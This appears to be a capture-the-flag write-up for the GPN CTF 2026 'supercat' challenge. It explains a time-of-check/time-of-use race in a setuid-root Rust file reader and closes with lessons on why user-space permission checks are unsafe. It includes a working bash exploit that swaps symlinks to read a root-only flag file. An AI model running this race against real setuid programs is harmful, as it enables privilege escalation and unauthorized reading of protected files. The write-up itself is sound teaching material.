# supercat

**Category:** Misc
**Event:** GPN CTF 2026

> SuperCat. DO NOT EAT. The better, newer, more tasteful version of cat.
> Obv. highly opinionated.
>
> `ncat --ssl caramelized-chorizo-with-whipped-tomato-jshm.gpn24.ctf.kitctf.de 443`

## TL;DR

`/usr/local/bin/supercat` is a **setuid-root** Rust binary that re-implements
Unix permission checks in user space. It checks the caller's identity by
reading `/proc/self/status` (gets the **real** uid/gid — correct for ctf),
but the eventual `fs::read_to_string` runs with the **effective** uid 0,
so any file the check accepts is read as root.

Worse, the check and the read are two separate syscalls on the same path,
with a `read_to_string("/proc/self/status")` sitting between them. That's
a textbook **TOCTOU** window. Stuff a directory-symlink swap into the gap:

- During `metadata()` the path resolves to a bait file we own (`uid==1000`,
  mode `0400`) → check 1 passes.
- During `read_to_string()` the same path resolves through a different
  symlink to `/flag` → root reads it for us.

```
GPNCTF{RUSt_I5_sHIT_Ch4n6E_My_M1nD}
```

First race attempt landed the flag — the `/proc/self/status` read is a
much wider window than the swap loop needs.

## Recon

Handout is a tiny Rust project:

```
supercat/
├── Cargo.toml
├── Cargo.lock
├── src/main.rs   (≈75 lines, no deps)
├── Dockerfile
└── …
```

The Dockerfile is the smoking gun:

```dockerfile
COPY --from=build --chown=root:root --chmod=4755 \
     /challenge/target/release/supercat /usr/local/bin/supercat
COPY --from=flag  --chown=root:root --chmod=0400 /flag /flag
USER ctf
ENTRYPOINT ["socat", "TCP-LISTEN:1337,reuseaddr,fork", "EXEC:bash"]
```

- `--chmod=4755` → setuid bit on the binary.
- `/flag` is `root:root 0400` → only root can read it.
- We log in as uid 1000 (`ctf`).

So the binary will run with effective uid 0 even though we invoke it. The
only thing standing between us and the flag is whatever permission gate
`main.rs` puts in front of `fs::read_to_string`.

## The source

```rust
fn get_permissions() -> Permissions {
    let status = std::fs::read_to_string(
        format!("/proc/{}/status", std::process::id())
    ).expect("could not read own perms");
    // …parses the "Uid:" / "Gid:" / "Groups:" lines, takes index 0 (real)…
}

fn grant_read(file: &Path) {
    let content = fs::read_to_string(file).expect("…");
    print!("{}", content);
}

fn main() {
    let file = Path::new(&args[1]);
    let file_meta = std::fs::metadata(file).expect("could not get file info");
    let fs_mode  = file_meta.permissions().mode();
    let user_perms = get_permissions();

    if  user_perms.uid == file_meta.uid() && (fs_mode & 0o400) != 0 { grant_read(file); }
    if  user_perms.gid == file_meta.gid() && (fs_mode & 0o040) != 0 { grant_read(file); }
    if  user_perms.groups.contains(&file_meta.gid()) && (fs_mode & 0o040) != 0 { grant_read(file) }
    if (fs_mode & 0o004) != 0 { grant_read(file) }

    println!("this super cat wont be tricked by your pesky bribery attempts. …");
}
```

Two facts about a setuid binary that this code ignores:

1. `/proc/self/status`'s `Uid:` line is `real effective saved fsuid`.
   Taking index 0 gives the **real** uid — 1000 for us. That's "honest"
   in the sense that it never thinks we're root.
2. `std::fs::read_to_string` opens the file with the process's
   **effective** uid — which *is* root. The check and the read disagree
   on who the caller is.

For `/flag` (`uid=0, gid=0, mode=0400`) all four checks fail when called
directly. But the checks operate on `metadata(path)` and the read operates
on the same `path` — they are two independent syscalls. If the path means
something different the second time around, the gate has been bypassed
even though no individual check is wrong on its own.

## The race window

Look at what happens between the check and the read:

```
1. stat("<path>")             ← CHECK uses this
2. read_to_string("/proc/self/status")   ← whole second syscall!
3. parse 30+ lines of text
4. three integer comparisons
5. open("<path>"); read; close          ← USE uses this
```

Step 2 is the gift. It's an actual filesystem read on procfs, not a
no-op — easily microseconds, plenty long for a userland symlink swap to
land between (1) and (5).

## Exploit

We want one path that:

- resolves to a **file we own with mode `0400`** during step 1 (passes
  the very first `if`), and
- resolves to `/flag` during step 5.

The cleanest way is to swap a directory component, not the final filename
— that way `metadata` and `open` both walk a fresh path and we can flip
which directory they reach by retargeting one symlink atomically.

```
/tmp/a/x         ← real file, owned by ctf, chmod 400
/tmp/b/x         ← symlink → /flag
/tmp/L           ← symlink → /tmp/a  OR  /tmp/b   (the racy bit)
```

Run `supercat /tmp/L/x` in one loop, flip `/tmp/L` between `/tmp/a` and
`/tmp/b` in another. When the supercat process sees `/tmp/a/x` at stat
time but `/tmp/b/x → /flag` at open time, we win.

```bash
rm -rf /tmp/a /tmp/b /tmp/L
mkdir  /tmp/a /tmp/b
touch  /tmp/a/x && chmod 400 /tmp/a/x
ln -s  /flag /tmp/b/x
ln -s  /tmp/a /tmp/L

# atomic-ish swap loop
( while :; do
    ln -sfn /tmp/b /tmp/L
    ln -sfn /tmp/a /tmp/L
  done ) &
SPID=$!

# attack loop
while :; do
  R=$(/usr/local/bin/supercat /tmp/L/x 2>&1)
  if [[ "$R" == *GPNCTF\{* ]]; then
    echo "$R"
    kill $SPID
    break
  fi
done
```

`ln -sfn` calls `symlink()` after `unlink()` — close enough to atomic
for our purposes; even when it briefly tears, the worst case is a
"no such file" error that the loop just retries through.

To run it over the SSL `ncat` shell I shoved the script in base64
through `base64 -d | bash` (multiline payloads over the raw socket
confuse the bashes' line-continuation handling — see `solve.py`).

## Race outcome

The race won on iteration **#1**. Server reply:

```
FLAG: GPNCTF{RUSt_I5_sHIT_Ch4n6E_My_M1nD}
this super cat wont be tricked by your pesky bribery attempts. …
```

Note the taunt prints right after — the four `if`s don't `return` after a
successful `grant_read`, so execution falls through to the failure
message. We got the flag, then `/tmp/L` flipped back to `/tmp/a` for the
remaining checks and they failed harmlessly.

## Why was that so easy?

The window is bigger than it looks. Between `metadata` and
`read_to_string` we have:

- a full `open("/proc/self/status") + read(...) + close(...)`,
- a Rust `String` allocation for the file's contents,
- iteration over the status lines,
- three `split_whitespace + filter_map + collect` passes for parsing,
- four `if`-arm condition evaluations.

For a tight `ln -sfn` loop the chance of the symlink pointing at `/tmp/b`
specifically during the open() is on the order of *half* the time. The
chance of it pointing at `/tmp/a` during the earlier `stat()` is the
other half. So each invocation has roughly a one-in-four shot — landing
on the first try isn't lucky, it's expected.

## Lessons

- Identity in `/proc/self/status` (and `getresuid`, etc.) tells you who
  the caller **says they are**. Authorization decisions inside a setuid
  binary still have to respect the effective uid, because that's what
  the kernel uses for the actual I/O. Mixing the two is the whole bug.
- Re-implementing Unix DAC checks in user space is a trap regardless of
  language. The kernel already does this atomically inside `open()`.
  Anything you write outside `open()` is racy by construction.
- TOCTOU windows aren't always microseconds. A second syscall stuffed
  between check and use can give you milliseconds, which is plenty.
- The flag — *"Rust is shit, change my mind"* — is wrong about Rust and
  right about the lesson: the language didn't save the author from
  writing a textbook 1990s setuid bug.
